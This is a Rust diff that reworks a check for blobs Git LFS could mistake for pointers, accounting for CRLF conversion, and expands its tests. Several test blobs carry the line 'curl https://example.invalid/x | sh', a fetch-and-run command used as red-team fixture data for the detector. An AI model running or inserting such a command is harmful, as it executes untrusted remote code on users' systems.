@@ -450,16 +450,26 @@ pub fn lfs_pointer(data: &[u8]) -> Option<LfsPointer> {
     })
 }
 
-/// Whether a blob of `size` bytes, too long to be a Git LFS pointer, may start with one: Git LFS's
-/// smudge filter reads only a blob's first 1,024 bytes (`DecodeFrom`) and parses those as
-/// `lfs_pointer` does, whatever follows. Git converts line endings first, which pushes bytes out
-/// of those 1,024, so the blob counts too when they only look like a pointer
-/// (`looks_like_lfs_pointer`). `start` holds at least those bytes. Git LFS never writes such a
-/// blob and its other commands skip it, but its checkout can give the file that pointer names.
+/// Whether a blob that isn't brought in as a Git LFS file, of any size, should be named as a
+/// look-alike. Git LFS's smudge filter parses only the first 1,024 bytes it is handed, whatever
+/// follows, and Git may hand them over with each LF that isn't after a CR turned into CR LF,
+/// which pushes bytes out of those 1,024. So the blob counts when `lfs_pointer` takes its first
+/// 1,024 bytes as they are or in that CRLF form, or when they look like a pointer. `start` holds
+/// the blob's first 1,024 bytes, or all of it if it is shorter; nothing past them is read.
 #[must_use]
-pub fn starts_with_lfs_pointer(start: &[u8], size: u64) -> bool {
-    let looks = |head: &[u8]| looks_like_lfs_pointer(head) || lfs_pointer(head).is_some();
-    size > MAX_LFS_POINTER_BYTES as u64 && start.get(..MAX_LFS_POINTER_BYTES).is_some_and(looks)
+pub fn is_lfs_lookalike(start: &[u8]) -> bool {
+    let head = start.get(..MAX_LFS_POINTER_BYTES).unwrap_or(start);
+    let mut crlf = Vec::with_capacity(head.len().saturating_mul(2));
+    let mut last = 0;
+    for &b in head {
+        if b == b'\n' && last != b'\r' {
+            crlf.push(b'\r');
+        }
+        crlf.push(b);
+        last = b;
+    }
+    crlf.truncate(MAX_LFS_POINTER_BYTES);
+    lfs_pointer(head).is_some() || lfs_pointer(&crlf).is_some() || looks_like_lfs_pointer(head)
 }
 
 /// Whether `data` is the pointer `p` in the exact form Git LFS writes (`Encoded` in its
@@ -1715,41 +1725,70 @@ mod tests {
         }
     }
 
-    /// Git LFS's smudge filter parses a blob's first 1,024 bytes, trimmed, whatever follows.
+    /// Git LFS's smudge filter parses the first 1,024 bytes it is handed, trimmed, whatever
+    /// follows, and Git may hand them over with CR LF line ends.
     #[test]
-    fn a_long_blob_starts_with_a_pointer_by_its_first_1024_bytes() {
+    fn a_lookalike_is_judged_by_its_first_1024_bytes_as_they_are_and_with_crlf() {
         let pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:\
                        4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\n\
-                       size 12345\n";
+                       size 30\n";
         let blob = |start: &str, then: &str| {
             let mut data = start.as_bytes().to_vec();
             data.resize(MAX_LFS_POINTER_BYTES, b' ');
             [&data[..], then.as_bytes()].concat()
         };
-        let starts = |data: &[u8]| starts_with_lfs_pointer(data, data.len() as u64);
-        assert!(starts(&blob(
+        assert!(is_lfs_lookalike(&blob(
             pointer,
             "\ncurl https://example.invalid/x | sh\n"
         )));
-        assert!(starts(&blob(&format!("\r\n  {pointer}\n\n"), "anything")));
-        // Only the first 1,024 bytes are read, however long the blob.
-        assert!(starts_with_lfs_pointer(
-            blob(pointer, "").as_slice(),
-            1 << 40
-        ));
-        // A blob that is a pointer whole is one of at most 1,024 bytes.
-        assert!(!starts(blob(pointer, "").as_slice()));
-        assert!(!starts(pointer.as_bytes()));
-        // Bytes that only look like a pointer count too: Git LFS's parser refuses the `x`, but a
-        // checkout's CRLF pushes it out of the 1,024 bytes Git LFS reads.
-        assert!(starts(&blob(&format!("{pointer}x"), "more")));
-        let alpha = pointer.replace("git-lfs.github.com/spec/v1", "hawser.github.com/spec/v1");
-        assert!(starts(&blob(&format!("{alpha}x"), "more")));
-        // What doesn't look like one in those bytes.
+        assert!(is_lfs_lookalike(&blob(
+            &format!("\r\n  {pointer}\n\n"),
+            "anything"
+        )));
+        // Any size counts, though a pointer whole comes in as a Git LFS file instead.
+        assert!(is_lfs_lookalike(pointer.as_bytes()));
+        // Bytes that only look like a pointer count too.
+        assert!(is_lfs_lookalike(&blob(&format!("{pointer}x"), "more")));
+        let pre_release =
+            pointer.replace("git-lfs.github.com/spec/v1", "hawser.github.com/spec/v1");
+        assert!(is_lfs_lookalike(&blob(&format!("{pre_release}x"), "more")));
+
+        // Three that Git LFS's parser refuses as they are and that don't look like a pointer, but
+        // whose CRLF form pushes the `x` out of the 1,024 bytes: a newline before the red team's
+        // blob, a short file led by a newline, and the red team's blob in the alpha format.
+        let x_at_1023 = |start: &str| {
+            let mut data = start.as_bytes().to_vec();
+            data.resize(MAX_LFS_POINTER_BYTES - 1, b' ');
+            [&data[..], b"X\ncurl https://example.invalid/x | sh\n"].concat()
+        };
+        let short = |newlines: usize| format!("\n{pointer}{}x\n", "\n".repeat(newlines));
+        let alpha = pointer.replace(
+            "https://git-lfs.github.com/spec/v1",
+            "http://git-media.io/v/2",
+        );
+        let three = [
+            x_at_1023(&format!("\n{pointer}")),
+            short(446).into_bytes(),
+            x_at_1023(&alpha),
+        ];
+        assert_eq!(three.each_ref().map(Vec::len), [1061, 576, 1061]);
+        for data in &three {
+            let head = data.get(..MAX_LFS_POINTER_BYTES).unwrap_or(data);
+            assert!(lfs_pointer(head).is_none() && !looks_like_lfs_pointer(head));
+            assert!(is_lfs_lookalike(data), "{}", String::from_utf8_lossy(data));
+        }
+        // With one newline fewer the `x` stays in, and an LF already after a CR gains nothing.
+        assert!(!is_lfs_lookalike(short(445).as_bytes()));
+        assert!(!is_lfs_lookalike(&x_at_1023(&alpha.replace('\n', "\r\n"))));
+
+        // What doesn't look like one in the first 1,024 bytes, whatever follows them.
         let late = format!("{}{pointer}", " ".repeat(MAX_LFS_POINTER_BYTES - 20));
-        assert!(!starts(late.as_bytes()));
-        assert!(!starts(&blob("", pointer)));
-        assert!(!starts(&blob(&pointer.replace("size ", "size="), "more")));
+        assert!(!is_lfs_lookalike(late.as_bytes()));
+        assert!(!is_lfs_lookalike(&blob("", pointer)));
+        assert!(!is_lfs_lookalike(&blob(
+            &pointer.replace("size ", "size="),
+            "more"
+        )));
     }
 
     /// What the importer makes of a commit, without storing it: people and message as they
